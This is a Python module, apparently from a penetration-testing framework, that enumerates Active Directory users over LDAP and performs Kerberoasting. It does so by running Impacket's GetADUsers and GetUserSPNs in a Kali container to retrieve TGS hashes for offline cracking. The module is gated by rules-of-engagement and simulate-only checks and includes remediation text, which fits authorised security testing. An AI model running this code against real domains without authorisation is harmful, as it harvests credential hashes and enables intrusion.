"""Active Directory probe — LDAP enum + Kerberoasting via Impacket/Kali."""
from __future__ import annotations

import asyncio
import re

from sdk.base import BaseModule, Finding, Phase, Severity, VulnType

try:
    from audit.decorators import audit_logged
    from sdk.decorators import roe_gated
except ImportError:
    def audit_logged(x):
        def dec(f): return f
        return dec
    def roe_gated(x):
        def dec(f): return f
        return dec


async def _docker_run(args: list[str], timeout: int = 300) -> str:
    cmd = ["docker", "run", "--rm", "--network=host", "kalilinux/kali-rolling"] + args
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return out.decode(errors="replace")
    except Exception:
        return ""


class ActiveDirectoryProbe(BaseModule):
    name = "active_directory"
    phase = Phase.POST_EXPLOIT
    vuln_types = [VulnType.KERBEROAST]  # noqa: RUF012
    author = "swift-core"
    version = "1.0"

    @roe_gated("exploit")
    @audit_logged("probe_executed")
    async def probe(self, target, session, roe) -> list[Finding]:
        params = getattr(target, "params", {}) or {}
        dc_ip = params.get("dc_ip", "")
        domain = params.get("domain", "")
        if not (dc_ip and domain):
            return []

        if getattr(roe, "simulate_only", True):
            return [Finding(
                module=self.name,
                vuln_type=VulnType.KERBEROAST,
                severity=Severity.INFO,
                title=f"AD probe simulated: {domain} @ {dc_ip}",
                description="simulate_only=True — Kerberoasting not executed. Set simulate_only=False to enable.",
                target_url=str(target),
                confidence=1.0,
                remediation="Review ROE simulate_only setting before executing.",
            )]

        findings: list[Finding] = []

        # LDAP enum
        ldap_out = await _docker_run([
            "python3", "-m", "impacket.examples.GetADUsers",
            "-all", "-dc-ip", dc_ip, f"{domain}/",
        ])
        users = re.findall(r"Name:\s+(\S+)", ldap_out)
        if users:
            findings.append(Finding(
                module=self.name,
                vuln_type=VulnType.KERBEROAST,
                severity=Severity.MEDIUM,
                title=f"AD LDAP enum: {len(users)} user(s) in {domain}",
                description=f"Domain users enumerated via LDAP: {', '.join(users[:10])}",
                target_url=str(target),
                confidence=0.96,
                request_evidence=f"GetADUsers -dc-ip {dc_ip} {domain}/",
                response_evidence=ldap_out[:500],
                remediation="Restrict anonymous LDAP enumeration. Require LDAP signing.",
            ))

        # Kerberoasting
        kerb_out = await _docker_run([
            "python3", "-m", "impacket.examples.GetUserSPNs",
            "-dc-ip", dc_ip, f"{domain}/", "-no-pass", "-request",
        ])
        spns = re.findall(r"\$krb5tgs\$[^\s]+", kerb_out)
        if spns:
            findings.append(Finding(
                module=self.name,
                vuln_type=VulnType.KERBEROAST,
                severity=Severity.CRITICAL,
                title=f"Kerberoastable: {len(spns)} SPN hash(es)",
                description=(
                    f"{len(spns)} TGS ticket(s) retrieved for offline cracking. "
                    "Service accounts with SPNs are vulnerable to Kerberoasting."
                ),
                target_url=str(target),
                confidence=0.97,
                request_evidence=f"GetUserSPNs -dc-ip {dc_ip} {domain}/",
                response_evidence=kerb_out[:500],
                oob_confirmed=True,
                remediation="Use gMSA accounts. Enforce strong passwords on service accounts. Monitor TGS requests.",
            ))

        return findings
